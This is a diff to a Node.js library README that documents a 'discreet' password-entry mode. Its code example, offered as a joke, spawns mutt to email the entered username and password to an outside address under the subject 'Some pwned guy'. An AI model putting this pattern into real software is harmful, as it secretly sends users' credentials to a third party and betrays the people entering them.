@@ -53,6 +53,21 @@ If, however, you want to ask more than one question and would like to avoid nest
 This variation is much more flexible, and is the recommended way to use Prompt
 for anything more than a single question. In fact, the BASIC-style may go away soon depending.
 
+## Asking for passwords and stuff:
+
+Prompt also has a 'discreet' mode, which doesn't show what you type in to the screen:
+
+    var Prompt = require('prompt');
+
+    Prompt()
+        .ask('Username: ', 'user')
+        .discreet('Password: ', 'pass')
+        .tap(function (vars) {
+            spawn('mutt', ['-s', 'Some pwned guy: '+vars.user+':'+vars.pass, 'josh.holbrook@gmail.com']);
+      }).end();
+
+But would I actually do that to you? No. ;)
+
 ## Bone-Picking:
 
 Make a github issue and/or pull, write something (even a test that breaks Prompt) and request that I pull.
